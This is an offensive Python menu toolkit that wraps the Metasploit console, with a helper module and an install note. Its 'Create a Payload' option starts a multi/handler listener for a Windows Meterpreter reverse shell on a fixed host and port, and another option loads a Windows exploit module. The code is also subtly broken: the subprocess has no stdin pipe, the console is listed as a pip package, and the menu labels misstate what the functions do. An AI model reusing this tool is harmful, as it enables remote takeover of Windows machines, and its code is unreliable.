import os
import sys
from msfconsole import Msfconsole
from colorama import init, Fore, Style
init()

class LuminaMetasploitToolkit:
    def __init__(self):
        self.msfconsole = Msfconsole()

    def display_menu(self):
        print(f"{Style.BRIGHT}{Fore.BLUE}Lumina Metasploit Toolkit Menu{Style.RESET_ALL}")
        print("1. Start Metasploit Console")
        print("2. Run a Vulnerability Scan")
        print("3. Create a Payload")
        print("4. Launch a Metasploit Module")
        print("5. Exit")

    def start_msfconsole(self):
        self.msfconsole.start()

    def run_vulnerability_scan(self):
        self.msfconsole.run_command("db_nmap")

    def create_payload(self):
        self.msfconsole.run_command("use exploit/multi/handler")
        self.msfconsole.run_command("set PAYLOAD windows/meterpreter/reverse_tcp")
        self.msfconsole.run_command("set LHOST 192.168.1.100")
        self.msfconsole.run_command("set LPORT 4444")
        self.msfconsole.run_command("exploit")

    def launch_metasploit_module(self):
        self.msfconsole.run_command("use exploit/windows/fileformat/ms10_046_word")

    def exit(self):
        print("Exiting Lumina Metasploit Toolkit.")
        sys.exit()

def main():
    toolkit = LuminaMetasploitToolkit()
    while True:
        toolkit.display_menu()
        choice = input("Enter your choice: ")
        if choice == "1":
            toolkit.start_msfconsole()
        elif choice == "2":
            toolkit.run_vulnerability_scan()
        elif choice == "3":
            toolkit.create_payload()
        elif choice == "4":
            toolkit.launch_metasploit_module()
        elif choice == "5":
            toolkit.exit()
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
```

```python
# msfconsole.py
import subprocess

class Msfconsole:
    def __init__(self):
        self.process = None

    def start(self):
        self.process = subprocess.Popen(["msfconsole"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Metasploit console started.")

    def run_command(self, command):
        self.process.stdin.write(f"{command}\n".encode())
        self.process.stdin.flush()
        output = self.process.stdout.readline().decode().strip()
        print(output)

    def stop(self):
        self.process.kill()
        print("Metasploit console stopped.")
```

```python
# requirements.txt
msfconsole
colorama
```

Note: You need to have Metasploit installed on your system and the msfconsole executable in your system's PATH. You also need to install the required packages by running `pip install -r requirements.txt` in your terminal.
